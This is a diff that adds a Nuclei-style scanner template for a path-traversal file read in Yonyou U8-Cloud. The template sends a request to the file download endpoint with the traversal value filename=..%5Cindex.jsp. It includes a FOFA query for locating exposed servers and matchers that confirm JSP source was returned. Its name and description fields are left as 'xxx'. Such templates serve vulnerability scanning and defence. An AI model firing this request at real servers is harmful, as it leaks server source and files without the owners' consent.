@@ -1,0 +1,28 @@
+id: yonyouNC_download_fileread
+info:
+  name: xxx
+  author: mike
+  severity: info
+  description: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="用友-U8-Cloud"
+http:
+  - raw:
+      - |
+        GET /portal/pt/xml/file/download?pageId=login&filename=..%5Cindex.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: word
+        part: body
+        words:
+          - "response.addHeader"
